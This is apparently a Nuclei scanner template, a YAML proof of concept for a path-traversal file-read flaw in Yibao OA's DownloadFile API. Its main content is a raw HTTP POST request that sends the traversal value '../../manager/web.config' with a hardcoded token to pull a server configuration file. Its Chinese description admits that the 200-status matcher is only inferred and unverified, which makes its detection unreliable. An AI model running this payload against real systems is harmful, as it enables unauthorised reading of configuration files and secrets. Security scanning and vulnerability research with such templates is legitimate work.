id: poc-iabgggm05nvn97zm
info:
  name: 易宝OA系统DownloadFile接口存在文件读取漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: lfi,2024
http:
- raw:
  - 'POST /api/files/DownloadFile HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0

    Content-Length: 94

    Accept-Encoding: gzip

    Content-Type: application/x-www-form-urlencoded


    token=zxh&requestFileName=../../manager/web.config&pathType=1&startPosition=0&bufferSize=1000'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
